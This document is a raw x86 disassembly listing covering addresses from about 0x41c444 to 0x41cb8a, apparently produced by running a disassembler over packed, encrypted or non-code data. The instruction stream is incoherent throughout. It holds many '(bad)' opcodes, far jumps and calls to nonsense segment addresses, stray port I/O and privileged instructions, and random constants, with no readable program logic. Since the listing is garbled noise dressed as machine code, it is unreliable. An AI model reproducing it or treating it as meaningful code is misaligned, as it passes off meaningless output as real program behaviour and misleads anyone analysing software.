  41c444:	aam    0xe5
  41c446:	jmp    0x8396:0xbb4c3027
  41c44d:	adc    BYTE PTR [eax+esi*8-0x69d0ccb4],al
  41c454:	mov    bl,0xbb
  41c456:	lds    eax,FWORD PTR [edi+0x5ea19b49]
  41c45c:	bound  eax,QWORD PTR [ecx]
  41c45e:	jecxz  0x41c3e1
  41c460:	dec    edi
  41c461:	sti    
  41c462:	sar    ecx,0x28
  41c465:	cmp    eax,0xf32780f9
  41c46a:	xlat   BYTE PTR ds:[ebx]
  41c46b:	mov    esi,0x8a7903b
  41c470:	test   DWORD PTR [ebx],ebp
  41c472:	mov    edi,0x959c1b56
  41c477:	push   edx
  41c478:	mov    ds:0xe37f87a4,eax
  41c47d:	stos   BYTE PTR es:[edi],al
  41c47e:	add    eax,0xef97f0f1
  41c483:	lods   eax,DWORD PTR ds:[esi]
  41c484:	jmp    0x0:0x0
  41c48b:	add    BYTE PTR [eax],al
  41c48d:	add    BYTE PTR [eax],al
  41c48f:	add    BYTE PTR [eax],al
  41c491:	mov    ah,0x4f
  41c493:	sbb    al,0x53
  41c495:	call   DWORD PTR [ebx-0x1]
  41c498:	out    dx,eax
  41c499:	inc    esi
  41c49a:	dec    esp
  41c49b:	add    eax,0xea8e3132
  41c4a0:	sub    al,0x1d
  41c4a2:	inc    ecx
  41c4a3:	add    DWORD PTR [eax],eax
  41c4a5:	lods   al,BYTE PTR ds:[esi]
  41c4a6:	add    eax,DWORD PTR [eax]
  41c4a8:	add    BYTE PTR ds:0x57aa4699,cl
  41c4ae:	pop    edi
  41c4af:	mov    ecx,0xe0647a04
  41c4b4:	pop    edi
  41c4b5:	int    0x6b
  41c4b7:	xor    eax,0x37ce60d9
  41c4bc:	dec    ecx
  41c4bd:	inc    BYTE PTR [edx+0x54]
  41c4c0:	call   0x5b64005f
  41c4c5:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4c7:	jae    0x41c512
  41c4c9:	test   DWORD PTR [esi-0x402d78b9],edi
  41c4cf:	inc    ebp
  41c4d0:	repnz nop
  41c4d2:	dec    eax
  41c4d3:	sub    eax,0xecdad640
  41c4d8:	pop    edi
  41c4d9:	xor    eax,0x5cad7f1e
  41c4de:	hlt    
  41c4df:	(bad)  
  41c4e0:	lods   eax,DWORD PTR ds:[esi]
  41c4e1:	jno    0x41c523
  41c4e3:	xchg   ebp,eax
  41c4e4:	xor    dh,BYTE PTR [eax+0x1c7f4495]
  41c4ea:	scas   eax,DWORD PTR es:[edi]
  41c4eb:	in     al,dx
  41c4ec:	(bad)  
  41c4ed:	cdq    
  41c4ee:	pop    ds
  41c4ef:	xor    al,0x72
  41c4f1:	ret    0x6813
  41c4f4:	fsub   st(7),st
  41c4f6:	sahf   
  41c4f7:	inc    ecx
  41c4f8:	push   ebx
  41c4f9:	dec    ecx
  41c4fa:	adc    al,0xc6
  41c4fc:	xchg   esi,eax
  41c4fd:	and    dl,BYTE PTR ds:0x9004a8b5
  41c503:	neg    DWORD PTR [edx-0x5c]
  41c506:	daa    
  41c507:	fs leave 
  41c509:	inc    esi
  41c50a:	sbb    BYTE PTR [edi],0x4e
  41c50d:	jg     0x41c53b
  41c50f:	loop   0x41c55f
  41c511:	pop    edi
  41c512:	out    0xb1,eax
  41c514:	loopne 0x41c523
  41c516:	mov    BYTE PTR [ebp+0x4302daa9],bh
  41c51c:	pop    edi
  41c51d:	fwait
  41c51e:	test   al,0x41
  41c520:	fist   WORD PTR [edx]
  41c522:	clc    
  41c523:	xor    DWORD PTR [ebx+0x29],0x33ddffcd
  41c52a:	push   es
  41c52b:	adc    edi,DWORD PTR [edi-0xa]
  41c52e:	adc    dh,bl
  41c530:	xor    al,0x25
  41c532:	xor    al,0x58
  41c534:	mov    dl,0x11
  41c536:	pop    ds
  41c537:	push   0xffffff8f
  41c539:	mov    bl,0x4d
  41c53b:	sbb    eax,0x45f6ac71
  41c540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c541:	in     al,dx
  41c542:	js     0x41c5c2
  41c544:	pop    edx
  41c545:	pop    ebx
  41c546:	adc    al,BYTE PTR [edx]
  41c548:	sub    al,0x6f
  41c54a:	add    ah,al
  41c54c:	rol    BYTE PTR [eax],0xcb
  41c54f:	push   ss
  41c550:	pop    ds
  41c551:	inc    esi
  41c552:	mov    edx,0x546a09ac
  41c557:	inc    ebx
  41c558:	fsubr  st,st(3)
  41c55a:	arpl   ax,di
  41c55c:	fimul  DWORD PTR [esi]
  41c55e:	je     0x41c53c
  41c560:	sti    
  41c561:	test   al,0x93
  41c563:	sar    DWORD PTR [edi],1
  41c565:	mov    BYTE PTR [ebp+eiz*1+0x7d],ch
  41c569:	loope  0x41c51a
  41c56b:	iret   
  41c56c:	mov    ebx,0x28f335bc
  41c571:	(bad)  
  41c573:	popa   
  41c574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c575:	hlt    
  41c576:	js     0x41c559
  41c578:	cmp    DWORD PTR [eax+0x50c6c609],eax
  41c57e:	sbb    edx,ecx
  41c580:	xchg   ebp,eax
  41c581:	in     eax,0x6a
  41c583:	inc    eax
  41c584:	xchg   ecx,eax
  41c585:	mov    esi,0x7717d124
  41c58a:	mov    ebx,0x83d6a5b0
  41c58f:	mov    edx,DWORD PTR es:[edi+0xceff2b6]
  41c596:	nop
  41c597:	fldenv [ecx]
  41c599:	fmul   QWORD PTR [edx-0xb]
  41c59c:	out    0xed,al
  41c59e:	xchg   BYTE PTR [edx+0xb111c11],cl
  41c5a4:	outs   dx,BYTE PTR ds:[esi]
  41c5a5:	xchg   BYTE PTR [ebx],bh
  41c5a7:	(bad)  
  41c5a9:	popf   
  41c5aa:	cwde   
  41c5ab:	lahf   
  41c5ac:	jnp    0x41c627
  41c5ae:	clc    
  41c5af:	lock jecxz 0x41c5fa
  41c5b2:	pop    eax
  41c5b3:	fxam   
  41c5b5:	xchg   esi,eax
  41c5b6:	clc    
  41c5b7:	sbb    al,0x18
  41c5b9:	xor    cl,ch
  41c5bb:	aas    
  41c5bc:	add    eax,0xa6399a0b
  41c5c1:	fldcw  WORD PTR [edx+0x21b0d09d]
  41c5c7:	test   DWORD PTR [ebx-0x33],edx
  41c5ca:	or     ch,ah
  41c5cc:	(bad)  
  41c5cd:	leave  
  41c5ce:	fcomp  DWORD PTR [edi+0x76f13f0a]
  41c5d4:	rcl    BYTE PTR [eax+0x4052018],0x54
  41c5db:	pop    edx
  41c5dc:	xor    al,0x2d
  41c5de:	mov    DWORD PTR [ecx+0x1],ebx
  41c5e1:	mov    al,0x12
  41c5e3:	aas    
  41c5e4:	pandn  mm4,QWORD PTR [ebx+0x57]
  41c5e8:	inc    edi
  41c5e9:	(bad)  
  41c5ea:	adc    al,0x5c
  41c5ec:	icebp  
  41c5ed:	sbb    bl,bh
  41c5ef:	xor    dh,BYTE PTR [ecx]
  41c5f1:	sbb    DWORD PTR ds:0x38879ecf,esi
  41c5f7:	into   
  41c5f8:	out    0x35,eax
  41c5fa:	and    eax,esp
  41c5fc:	xor    BYTE PTR [ebx],dh
  41c5fe:	pop    edi
  41c5ff:	(bad)  
  41c600:	hlt    
  41c601:	cdq    
  41c602:	lea    edx,[edi]
  41c604:	in     al,dx
  41c605:	cmp    BYTE PTR [eax*8+0x654b49eb],ch
  41c60c:	lahf   
  41c60d:	cmp    DWORD PTR [edi],ecx
  41c60f:	pop    es
  41c610:	mov    esp,ecx
  41c612:	sub    eax,0x8f9644a0
  41c617:	stos   DWORD PTR es:[edi],eax
  41c618:	cmp    bh,BYTE PTR [ebx-0x2810d81f]
  41c61e:	sub    ecx,eax
  41c620:	sub    ah,BYTE PTR [edx-0x73]
  41c623:	les    edx,FWORD PTR [ecx]
  41c625:	xchg   BYTE PTR [eax],ch
  41c627:	cmp    bl,BYTE PTR [edx]
  41c629:	cli    
  41c62a:	daa    
  41c62b:	pop    ds
  41c62c:	xor    esi,DWORD PTR [eax-0x2f]
  41c62f:	cs ins BYTE PTR es:[edi],dx
  41c631:	aam    0x36
  41c633:	mov    ds:0x4f8cce0b,eax
  41c638:	push   edx
  41c639:	cwde   
  41c63a:	adc    eax,0xdfa0a075
  41c63f:	pushf  
  41c640:	in     eax,dx
  41c641:	test   DWORD PTR [edi],esp
  41c643:	and    eax,0x6094e6f3
  41c648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c649:	rcl    ch,1
  41c64b:	(bad)  
  41c64c:	mov    dl,0xb1
  41c64e:	push   ecx
  41c64f:	leave  
  41c650:	push   ss
  41c651:	mov    dh,BYTE PTR [edx+eiz*1-0x75]
  41c655:	sbb    al,ch
  41c657:	inc    edi
  41c658:	hlt    
  41c659:	sub    ch,BYTE PTR [eax]
  41c65b:	dec    ecx
  41c65c:	mov    fs,eax
  41c65e:	stos   BYTE PTR es:[edi],al
  41c65f:	jl     0x41c5ec
  41c661:	dec    edi
  41c662:	lahf   
  41c663:	cdq    
  41c664:	fnstcw WORD PTR [ecx+0x23]
  41c667:	stos   DWORD PTR es:[edi],eax
  41c668:	imul   ebp,DWORD PTR ds:0xad231220,0x74
  41c66f:	call   0xe8d9:0x3f2ea2d5
  41c676:	fadd   st(5),st
  41c678:	sub    edx,ecx
  41c67a:	in     eax,0x46
  41c67c:	dec    ebp
  41c67e:	ret    
  41c67f:	test   BYTE PTR [ecx+ebx*2-0x80],0x5a
  41c684:	addr16 lock mov ebx,0x813e32a7
  41c68b:	pop    es
  41c68c:	out    dx,eax
  41c68d:	cmp    eax,0x667143be
  41c692:	jae    0x41c627
  41c694:	fild   WORD PTR [ecx-0x36]
  41c697:	add    al,0xad
  41c699:	mov    ah,0x63
  41c69b:	(bad)  [ebp+ecx*1-0x48]
  41c69f:	mov    cl,0xcb
  41c6a1:	pop    ecx
  41c6a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6a3:	add    al,0x4f
  41c6a5:	cld    
  41c6a6:	push   edx
  41c6a7:	mov    ebp,0x93b29e2d
  41c6ac:	push   es
  41c6ad:	push   ebx
  41c6ae:	cld    
  41c6af:	adc    DWORD PTR [edi+0x67],0xfffffffa
  41c6b3:	loope  0x41c72c
  41c6b5:	push   esp
  41c6b6:	loop   0x41c667
  41c6b8:	mov    BYTE PTR [edi+0x16],ah
  41c6bb:	sub    eax,0x315e5d6e
  41c6c0:	dec    esi
  41c6c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6c2:	add    ebx,eax
  41c6c4:	addr16 xchg edx,eax
  41c6c6:	pop    DWORD PTR [esi+0x5b10d98]
  41c6cc:	jmp    FWORD PTR [eax+0x27]
  41c6cf:	inc    edi
  41c6d0:	loop   0x41c65c
  41c6d2:	sahf   
  41c6d3:	mov    ah,0xd5
  41c6d5:	mov    ds,WORD PTR [eax+0x16]
  41c6d8:	or     eax,0x8b41ed7
  41c6dd:	fdivr  st,st(3)
  41c6df:	mov    WORD PTR [ecx],ds
  41c6e1:	rcr    DWORD PTR [ecx],0xf7
  41c6e4:	xor    ah,BYTE PTR [eax]
  41c6e6:	shld   DWORD PTR [ecx],ecx,0x31
  41c6ea:	mov    WORD PTR [eax-0x46],?
  41c6ed:	stc    
  41c6ee:	leave  
  41c6ef:	cs sbb eax,0xf69bb637
  41c6f5:	call   0xa889:0x3bda660f
  41c6fc:	inc    esi
  41c6fd:	xchg   edx,eax
  41c6fe:	jnp    0x41c6d4
  41c700:	jg     0x41c738
  41c702:	mov    DWORD PTR [edx-0x40],ebp
  41c705:	cmp    eax,0xb5b67a90
  41c70a:	and    DWORD PTR [ebp+0x9],ebp
  41c70d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c70e:	pop    edx
  41c70f:	test   DWORD PTR [eax+edi*2],ebp
  41c712:	pop    eax
  41c713:	sub    eax,0x5d1bcc5c
  41c718:	inc    esp
  41c719:	sbb    eax,0x2665c475
  41c71e:	(bad)  
  41c71f:	rcr    BYTE PTR [ecx-0x7ccde279],1
  41c725:	jle    0x41c6b4
  41c727:	adc    ah,BYTE PTR [edi]
  41c729:	stc    
  41c72a:	and    al,0xf6
  41c72c:	push   ss
  41c72d:	out    0x40,eax
  41c72f:	fldlg2 
  41c731:	cmp    ecx,ebp
  41c733:	sub    BYTE PTR [ebp-0x54],dh
  41c736:	mov    bh,0x5d
  41c738:	adc    BYTE PTR [edi+0x4d],ah
  41c73b:	mov    ebp,es
  41c73d:	cld    
  41c73e:	pushf  
  41c73f:	adc    eax,eax
  41c741:	jmp    0x1c25:0xd86f6baf
  41c748:	je     0x41c715
  41c74a:	pop    edx
  41c74b:	inc    ebp
  41c74c:	pop    es
  41c74d:	fldenv [eax]
  41c74f:	cmp    eax,DWORD PTR [edi+0x2f]
  41c752:	test   eax,0x87e34640
  41c757:	push   es
  41c758:	jno    0x41c792
  41c75a:	in     al,0x36
  41c75c:	pop    eax
  41c75d:	adc    DWORD PTR [edx-0x36],ecx
  41c760:	jmp    0x7bad:0x7195a045
  41c767:	add    esp,DWORD PTR [ebx-0x7a0169a8]
  41c76d:	inc    ecx
  41c76e:	shl    DWORD PTR [ebx+ebp*1-0x15],0x27
  41c773:	sub    eax,0x509244f
  41c778:	stc    
  41c779:	or     DWORD PTR [esi-0x61],esp
  41c77c:	cmc    
  41c77d:	add    esi,DWORD PTR [ecx-0x11f9981c]
  41c783:	jle    0x41c79b
  41c785:	inc    eax
  41c786:	(bad)  
  41c787:	idiv   DWORD PTR [ebx]
  41c789:	push   edx
  41c78a:	dec    esp
  41c78b:	jbe    0x41c77d
  41c78d:	push   ds
  41c78e:	outs   dx,DWORD PTR ds:[esi]
  41c78f:	data16 jne 0x41c7df
  41c792:	in     eax,dx
  41c793:	inc    edi
  41c794:	jb     0x41c71c
  41c796:	pop    es
  41c797:	loopne 0x41c7c6
  41c799:	add    edx,DWORD PTR [edx-0x1a]
  41c79c:	and    bl,BYTE PTR [ecx+0x431a8013]
  41c7a2:	out    dx,eax
  41c7a3:	aad    0x5f
  41c7a5:	and    eax,0x34a2bf60
  41c7aa:	mov    eax,0xa0958b29
  41c7af:	and    DWORD PTR [esi+edx*1+0x10],esp
  41c7b3:	(bad)  
  41c7b4:	pop    eax
  41c7b5:	je     0x41c7bb
  41c7b7:	pushf  
  41c7b8:	or     dh,BYTE PTR [eax+0x23]
  41c7bb:	sub    edx,DWORD PTR [edi+ebp*4+0xb]
  41c7bf:	pop    edi
  41c7c0:	popa   
  41c7c1:	sahf   
  41c7c2:	es mov eax,0xcda02922
  41c7c8:	retf   
  41c7c9:	mov    al,ds:0x8c8f2a6e
  41c7ce:	and    eax,0x85f54dad
  41c7d3:	fwait
  41c7d4:	(bad)  
  41c7d5:	jnp    0x41c7fe
  41c7d7:	ret    0xdddf
  41c7da:	sti    
  41c7db:	shl    DWORD PTR [ebx+0x35],0x32
  41c7df:	daa    
  41c7e0:	je     0x41c84f
  41c7e2:	mov    al,ds:0xbae0a01c
  41c7e7:	mul    BYTE PTR [edi+0x71]
  41c7ea:	fwait
  41c7eb:	sbb    ch,BYTE PTR [ecx-0x7727ddaa]
  41c7f1:	stos   BYTE PTR es:[edi],al
  41c7f2:	pop    es
  41c7f3:	mov    DWORD PTR [edi+0x434b9c1b],ebp
  41c7f9:	imul   ebx,DWORD PTR [edx-0x69],0x2789d7c0
  41c800:	fist   WORD PTR [esi]
  41c802:	and    edi,ebx
  41c804:	jge    0x41c865
  41c806:	jne    0x41c7a6
  41c808:	xor    eax,0x24cd0d91
  41c80d:	in     al,dx
  41c80e:	fst    DWORD PTR [edi-0x45baf2b7]
  41c814:	lock xor al,0x4e
  41c817:	adc    dl,BYTE PTR es:[ecx-0x28]
  41c81b:	outs   dx,DWORD PTR ds:[esi]
  41c81c:	fwait
  41c81d:	loopne 0x41c892
  41c81f:	pop    esi
  41c820:	and    esp,DWORD PTR [esp+edx*8]
  41c823:	aad    0x42
  41c825:	clc    
  41c826:	mov    eax,0xd5ee3f50
  41c82b:	jbe    0x41c863
  41c82d:	rcl    edi,cl
  41c82f:	push   edx
  41c830:	inc    ebp
  41c831:	out    dx,al
  41c832:	or     edx,DWORD PTR [ecx-0x45055e25]
  41c838:	push   ebp
  41c839:	les    ecx,FWORD PTR [edx]
  41c83b:	adc    bh,BYTE PTR [esi+0x29]
  41c83e:	f2xm1  
  41c840:	leave  
  41c841:	lahf   
  41c842:	popa   
  41c843:	pop    eax
  41c844:	cmp    ebp,ebx
  41c846:	jnp    0x41c8a9
  41c848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c849:	mov    edi,0x9c68e3bd
  41c84e:	pop    ecx
  41c84f:	mov    ecx,0x6e4af90d
  41c854:	dec    ebx
	...
  41c861:	(bad)  
  41c862:	leave  
  41c863:	or     BYTE PTR [eax-0x12131ef3],ah
  41c869:	add    BYTE PTR [esi-0x1e],al
  41c86c:	or     DWORD PTR [esi+0x14],edx
  41c86f:	outs   dx,DWORD PTR ds:[esi]
  41c870:	xchg   ecx,ecx
  41c872:	inc    esp
  41c873:	add    DWORD PTR [eax],eax
  41c875:	lods   al,BYTE PTR ds:[esi]
  41c876:	add    eax,DWORD PTR [eax]
  41c878:	add    BYTE PTR [ebp+0x22],bh
  41c87b:	push   edi
  41c87c:	cdq    
  41c87d:	xor    BYTE PTR [ebx],bh
  41c87f:	loope  0x41c8b1
  41c881:	push   esi
  41c882:	xchg   BYTE PTR [edx-0x6ea63e28],al
  41c888:	retf   
  41c889:	ins    BYTE PTR es:[edi],dx
  41c88a:	push   ds
  41c88b:	cs aaa 
  41c88d:	push   0xee9d549b
  41c892:	mov    edi,0x6b6b1e0b
  41c897:	cmc    
  41c898:	test   eax,0xbfac4b83
  41c89d:	xor    eax,0xba7daef2
  41c8a2:	xor    DWORD PTR [esi],ebp
  41c8a4:	neg    BYTE PTR [esi]
  41c8a6:	stc    
  41c8a7:	and    dh,BYTE PTR [eax]
  41c8a9:	pop    es
  41c8aa:	iret   
  41c8ab:	fstp   QWORD PTR [edi-0x667e74fe]
  41c8b1:	dec    esp
  41c8b2:	xchg   ebp,eax
  41c8b3:	rol    BYTE PTR [edx+0x4a],0xee
  41c8b7:	jo     0x41c8d1
  41c8b9:	pop    esp
  41c8ba:	mov    ss,WORD PTR [ecx+0x5c5f11cd]
  41c8c0:	mov    cl,0x8f
  41c8c2:	sbb    al,0x0
  41c8c4:	shl    DWORD PTR [edi],0x96
  41c8c7:	jl     0x41c8a0
  41c8c9:	call   0xea7d2e5d
  41c8ce:	push   ss
  41c8cf:	adc    cl,BYTE PTR [ebp-0x41eaf9e2]
  41c8d5:	xlat   BYTE PTR ds:[ebx]
  41c8d6:	pop    edi
  41c8d7:	jp     0x41c912
  41c8d9:	dec    edx
  41c8da:	out    0xcf,al
  41c8dc:	add    DWORD PTR [ebx+0x11],0xffffff88
  41c8e0:	imul   edi,eax,0xe1b3aa83
  41c8e6:	inc    esp
  41c8e7:	imul   ebp,DWORD PTR [esi],0x52
  41c8ea:	and    ah,0x9
  41c8ed:	add    al,0xe7
  41c8ef:	test   DWORD PTR [ebx-0x12cafd2c],ebx
  41c8f5:	mov    esi,?
  41c8f7:	imul   DWORD PTR [edi-0x63dc3451]
  41c8fd:	rcr    BYTE PTR [ebx-0x20],1
  41c900:	dec    esp
  41c901:	aam    0x7c
  41c903:	in     al,0x47
  41c905:	and    al,0x1e
  41c907:	xlat   BYTE PTR ds:[ebx]
  41c908:	xchg   ebx,eax
  41c909:	(bad)  
  41c90a:	stos   DWORD PTR es:[edi],eax
  41c90b:	inc    eax
  41c90c:	sahf   
  41c90d:	xor    BYTE PTR [edx],cl
  41c90f:	pusha  
  41c910:	sub    eax,0x7ca266de
  41c915:	adc    DWORD PTR [edi+edx*2],esp
  41c918:	mov    bh,0xba
  41c91a:	call   0x39a0cff9
  41c91f:	aad    0xd2
  41c921:	mov    dh,0x1b
  41c923:	inc    edx
  41c924:	add    DWORD PTR [edi-0x62bc8275],edx
  41c92a:	inc    ecx
  41c92b:	frstor [ebp+0x38]
  41c92e:	retf   
  41c92f:	dec    edx
  41c930:	mov    esi,0xecb57a3b
  41c935:	dec    edx
  41c936:	jnp    0x41c8f1
  41c938:	add    ecx,DWORD PTR [ebx+esi*1+0x4]
  41c93c:	dec    eax
  41c93d:	test   DWORD PTR [eax],edx
  41c93f:	add    ah,BYTE PTR [ebp-0x2c]
  41c942:	or     al,0x4e
  41c944:	call   0xeae8:0x99a9fc44
  41c94b:	xor    cl,bl
  41c94d:	scas   al,BYTE PTR es:[edi]
  41c94e:	mov    bl,0xe3
  41c950:	clc    
  41c951:	inc    ebp
  41c952:	in     eax,dx
  41c953:	lahf   
  41c954:	sub    ebp,ebp
  41c956:	pushf  
  41c957:	inc    esp
  41c958:	pop    esp
  41c959:	dec    ebp
  41c95a:	icebp  
  41c95b:	jb     0x41c928
  41c95d:	out    dx,eax
  41c95e:	jae    0x41c9cc
  41c960:	jae    0x41c8ef
  41c962:	in     al,dx
  41c963:	lods   al,BYTE PTR ds:[esi]
  41c964:	pop    ecx
  41c965:	fwait
  41c966:	lods   al,BYTE PTR ds:[esi]
  41c967:	sub    BYTE PTR [eax-0x398cc8d4],bh
  41c96d:	xor    bl,bh
  41c96f:	jmp    0x6619c107
  41c974:	inc    edx
  41c975:	xor    al,0x62
  41c977:	stc    
  41c978:	xchg   esi,eax
  41c979:	sbb    DWORD PTR [edi],0xffffffb9
  41c97c:	xor    al,0x98
  41c97f:	cwde   
  41c980:	pop    edi
  41c981:	mov    WORD PTR [eax],cs
  41c983:	xor    eax,ebx
  41c985:	test   al,0xfd
  41c987:	gs fdiv st,st(2)
  41c98a:	ficomp WORD PTR [edx]
  41c98c:	call   0xc9449285
  41c991:	jne    0x41c914
  41c993:	sbb    ebp,ebx
  41c995:	repnz pop ebp
  41c997:	inc    ebx
  41c998:	xchg   BYTE PTR [ebp+0x3967bcc7],ch
  41c99e:	ret    
  41c99f:	and    BYTE PTR [ebx-0x7d7c49bb],0xf7
  41c9a6:	and    DWORD PTR [edi],edi
  41c9a8:	sbb    bh,BYTE PTR [eax]
  41c9aa:	leave  
  41c9ab:	lds    esi,FWORD PTR [eax]
  41c9ad:	dec    esp
  41c9ae:	in     al,0x4
  41c9b0:	imul   edx,DWORD PTR [edi*8-0x79f7af0b],0xffffffca
  41c9b8:	loopne 0x41c95f
  41c9ba:	shl    DWORD PTR [eax+0x41],0x4b
  41c9be:	call   0xb1b7:0x7a0d52da
  41c9c5:	sahf   
  41c9c6:	jbe    0x41ca3c
  41c9c8:	push   ebp
  41c9c9:	neg    BYTE PTR [ebp-0x7846600c]
  41c9cf:	xchg   BYTE PTR [ebx],dh
  41c9d1:	pop    ebx
  41c9d2:	mov    al,ds:0x6a3728f
  41c9d7:	scas   eax,DWORD PTR es:[edi]
  41c9d8:	addr16 out 0x87,eax
  41c9db:	pop    esi
  41c9dc:	xchg   cl,cl
  41c9de:	push   DWORD PTR ds:0xa0e21f5b
  41c9e4:	loop   0x41c9cb
  41c9e6:	or     esi,DWORD PTR [eax]
  41c9e8:	add    eax,DWORD PTR [ecx]
  41c9ea:	sti    
  41c9eb:	enter  0x14a8,0xdd
  41c9ef:	loop   0x41ca35
  41c9f1:	loopne 0x41c9aa
  41c9f3:	shl    BYTE PTR [ebp+0x70c9cc8c],0x73
  41c9fa:	pusha  
  41c9fb:	xor    esp,DWORD PTR [edx+0x5ac6872a]
  41ca01:	sub    dh,cl
  41ca03:	(bad)  
  41ca04:	icebp  
  41ca05:	fist   DWORD PTR [ebx+0x70]
  41ca08:	push   ecx
  41ca09:	xchg   ebp,eax
  41ca0a:	scas   eax,DWORD PTR es:[edi]
  41ca0b:	mov    ecx,0x4f617a4b
  41ca10:	inc    ebx
  41ca11:	cmp    cl,BYTE PTR [esi-0x50]
  41ca14:	in     al,dx
  41ca15:	(bad)  
  41ca16:	loop   0x41c9e1
  41ca18:	mov    esp,0x4dc0b0b1
  41ca1d:	cli    
  41ca1e:	(bad)  
  41ca1f:	mov    dh,0xe8
  41ca21:	push   es
  41ca22:	mov    cl,0xd1
  41ca24:	ret    
  41ca25:	icebp  
  41ca26:	out    0x43,eax
  41ca28:	out    0x37,eax
  41ca2a:	aas    
  41ca2b:	adc    DWORD PTR [edi+0x3d],ecx
  41ca2e:	mov    ebx,0x4864d248
  41ca33:	mov    es,WORD PTR [eax+0xa]
  41ca36:	cmp    esi,0x19a05695
  41ca3c:	mov    bl,0x65
  41ca3e:	ds gs adc ecx,esp
  41ca42:	jmp    0x94e5:0xbe6b0abc
  41ca49:	inc    esi
  41ca4a:	cld    
  41ca4b:	outs   dx,DWORD PTR ds:[esi]
  41ca4c:	sub    al,0x12
  41ca4e:	fld    DWORD PTR [eax+0xdd4c2ba]
  41ca54:	retf   0xab1c
  41ca57:	mov    ebp,0xa020e900
  41ca5c:	das    
  41ca5d:	inc    edx
  41ca5e:	push   edx
  41ca5f:	loopne 0x41c9e2
  41ca61:	lds    edi,FWORD PTR [esi+0x44]
  41ca64:	sbb    ah,bl
  41ca66:	add    esp,esi
  41ca68:	imul   edx,DWORD PTR [edi],0xffffffe4
  41ca6b:	sub    BYTE PTR [eax+0x5],ah
  41ca6e:	push   eax
  41ca6f:	cwde   
  41ca70:	test   DWORD PTR [eax+0x36ad422],0xf260ce71
  41ca7a:	icebp  
  41ca7b:	ret    0xab73
  41ca7e:	cs fdivp st(0),st
  41ca81:	das    
  41ca82:	jecxz  0x41ca41
  41ca84:	or     bh,al
  41ca86:	sub    esp,esi
  41ca88:	sub    al,BYTE PTR cs:[ebp+ebx*8+0x61]
  41ca8d:	clc    
  41ca8e:	push   es
  41ca8f:	sahf   
  41ca90:	leave  
  41ca91:	xchg   ecx,eax
  41ca92:	inc    esp
  41ca93:	jle    0x41cb0e
  41ca95:	push   edi
  41ca96:	sub    eax,0xbf09095c
  41ca9b:	inc    edi
  41ca9c:	imul   edi,DWORD PTR [edi+0x29],0xffffff84
  41caa0:	sbb    dh,BYTE PTR [esi+0x42]
  41caa3:	cld    
  41caa4:	jnp    0x41cb16
  41caa6:	sti    
  41caa7:	fidivr WORD PTR [ebx]
  41caa9:	xchg   ebx,eax
  41caaa:	xor    dl,ch
  41caac:	hlt    
  41caad:	outs   dx,BYTE PTR ds:[esi]
  41caae:	(bad)  
  41caaf:	pop    eax
  41cab0:	jnp    0x41caa4
  41cab2:	inc    edi
  41cab3:	pop    edi
  41cab4:	xchg   esp,eax
  41cab5:	sbb    al,BYTE PTR [esi]
  41cab7:	xchg   esp,eax
  41cab8:	pop    es
  41cab9:	jbe    0x41ca62
  41cabb:	jae    0x41caf6
  41cabd:	sahf   
  41cabe:	test   al,0xc3
  41cac0:	xchg   edx,eax
  41cac1:	jb     0x41cb3d
  41cac3:	scas   al,BYTE PTR es:[edi]
  41cac4:	fcmovnbe st,st(7)
  41cac6:	pop    es
  41cac7:	mov    ecx,0xe59fe49a
  41cacc:	sub    ah,BYTE PTR [ebx]
  41cace:	adc    eax,0xe821d06e
  41cad3:	shl    DWORD PTR [esi+0x40],cl
  41cad6:	and    BYTE PTR ds:0x6f5b12db,0x79
  41cadd:	mov    edi,0x4a9afc73
  41cae2:	shr    ebp,cl
  41cae4:	dec    eax
  41cae5:	out    dx,eax
  41cae6:	sbb    dh,dh
  41cae8:	retf   0x29f8
  41caeb:	mov    al,ds:0xc4a5e59f
  41caf0:	fmul   QWORD PTR [ebp+0x42]
  41caf3:	ss retf 
  41caf5:	out    0x21,eax
  41caf7:	jle    0x41cae0
  41caf9:	adc    eax,0xd07fd745
  41cafe:	sub    BYTE PTR [esi+eax*4],dl
  41cb01:	ror    DWORD PTR [ecx-0x44b71bca],cl
  41cb07:	jecxz  0x41cb7c
  41cb09:	add    al,0xd5
  41cb0b:	(bad)  
  41cb0c:	push   0xe1a36651
  41cb11:	pop    ebp
  41cb12:	dec    edi
  41cb13:	mov    esp,0x6e3ee5ae
  41cb18:	fsub   DWORD PTR [ecx+0xd]
  41cb1b:	ins    DWORD PTR es:[edi],dx
  41cb1c:	cld    
  41cb1d:	push   ebx
  41cb1f:	popa   
  41cb20:	cwde   
  41cb21:	retf   
  41cb22:	lea    esp,[ecx+0x6ec21e59]
  41cb28:	test   eax,0x4e1b8753
  41cb2d:	mov    esi,0xaaedcf1
  41cb32:	sar    BYTE PTR [ecx-0x3a9f8933],1
  41cb38:	sbb    eax,0x860e0e1d
  41cb3d:	test   BYTE PTR [esi+0x29],bh
  41cb40:	inc    edi
  41cb41:	fwait
  41cb42:	push   ss
  41cb43:	lds    edi,FWORD PTR es:[ebx+0x2716ca09]
  41cb4a:	sbb    ch,ch
  41cb4c:	mov    edi,0x637a6e7f
  41cb51:	xchg   esi,eax
  41cb52:	mov    ecx,0x8a6e9b29
  41cb57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb58:	push   ss
  41cb59:	test   eax,0xf03bc009
  41cb5e:	adc    DWORD PTR [ecx+0x3c],ebp
  41cb61:	out    dx,eax
  41cb62:	cmp    BYTE PTR [edi+edi*1-0x4b],cl
  41cb66:	mov    dl,0x48
  41cb68:	sub    esp,DWORD PTR [esi]
  41cb6a:	clc    
  41cb6b:	inc    ebx
  41cb6c:	lock inc eax
  41cb6e:	sub    al,0x20
  41cb70:	or     edi,DWORD PTR [esi-0x1281bad3]
  41cb76:	lods   eax,DWORD PTR ds:[esi]
  41cb77:	xor    ch,BYTE PTR [ebp+0x6d]
  41cb7a:	loop   0x41cb3e
  41cb7c:	neg    DWORD PTR [eax+0x14cdb7c6]
  41cb82:	mov    ah,0xc2
  41cb84:	jg     0x41cbfd
  41cb86:	aad    0x82
  41cb88:	jbe    0x41cb41
  41cb8a:	mov    edi,0x6adc1d0
